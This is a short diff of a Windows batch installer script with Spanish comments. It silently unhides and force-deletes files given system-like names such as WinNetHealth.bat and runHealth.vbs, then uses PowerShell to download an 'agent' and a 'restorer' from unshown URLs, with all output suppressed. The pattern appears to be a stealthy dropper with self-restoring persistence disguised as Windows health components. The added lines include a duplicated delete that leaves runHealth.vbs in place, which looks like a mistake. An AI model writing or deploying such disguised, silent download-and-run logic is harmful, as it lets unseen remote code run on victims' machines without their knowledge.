@@ -20,11 +20,14 @@ if not exist "%DIR_RECOVERY%" mkdir "%DIR_RECOVERY%" >nul 2>&1
 attrib -h -s -r "%DIR_AGENTE%\sys_engine.bat" >nul 2>&1
 attrib -h -s -r "%DIR_AGENTE%\run.vbs" >nul 2>&1
 attrib -h -s -r "%DIR_SISTEMA%\WinNetHealth.bat" >nul 2>&1
+attrib -h -s -r "%DIR_SISTEMA%\runHealth.vbs" >nul 2>&1
 
 :: Borramos los archivos viejos a la fuerza (/f) y en silencio (/q) por si acaso
 del /f /q "%DIR_AGENTE%\sys_engine.bat" >nul 2>&1
 del /f /q "%DIR_AGENTE%\run.vbs" >nul 2>&1
 del /f /q "%DIR_SISTEMA%\WinNetHealth.bat" >nul 2>&1    
+del /f /q "%DIR_SISTEMA%\WinNetHealth.bat" >nul 2>&1  
+
 :: --- 3. DESCARGA DE COMPONENTES ---
 powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_AGENTE%', '%DIR_AGENTE%\sys_engine.bat')" >nul 2>&1
 powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_RESTAURADOR%', '%DIR_SISTEMA%\WinNetHealth.bat')" >nul 2>&1
